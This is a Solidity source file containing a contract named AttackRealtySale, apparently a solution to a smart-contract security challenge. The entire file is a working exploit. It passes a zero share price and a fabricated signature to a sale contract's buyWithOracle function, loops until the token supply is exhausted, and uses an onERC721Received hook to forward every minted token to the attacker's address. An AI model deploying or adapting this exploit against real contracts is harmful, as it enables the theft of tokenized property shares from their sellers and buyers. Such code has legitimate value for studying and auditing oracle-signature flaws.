//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

struct SharePrice {
    uint256 expires; // Time which the price expires
    uint256 price; // Share Price in ETH
}

struct Signature {
    uint8 v;
    bytes32 r;
    bytes32 s;
}

interface IRealtySale {
    function shareToken() external returns (address);

    function buyWithOracle(
        SharePrice calldata sharePrice,
        Signature calldata signature
    ) external payable;
}

interface IRealtyToken {
    function transferFrom(address from, address to, uint256 tokenId) external;

    function lastTokenID() external returns (uint256);

    function maxSupply() external returns (uint256);
}

contract AttackRealtySale is Ownable {
    address private immutable realtySale;
    address private immutable realtyToken;

    constructor(address _realtySale) {
        realtySale = _realtySale;
        realtyToken = IRealtySale(realtySale).shareToken();
    }

    function attack() public onlyOwner {
        SharePrice memory shareprice = SharePrice(block.timestamp + 9999, 0);
        Signature memory sign = Signature(
            1,
            keccak256("random1"),
            keccak256("random 2")
        );
        uint256 currSupply = IRealtyToken(realtyToken).lastTokenID();
        uint256 maxSupply = IRealtyToken(realtyToken).maxSupply();

        while (currSupply < maxSupply) {
            IRealtySale(realtySale).buyWithOracle(shareprice, sign);
            currSupply++;
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        IRealtyToken(realtyToken).transferFrom(address(this), owner(), tokenId);
        return this.onERC721Received.selector;
    }
}
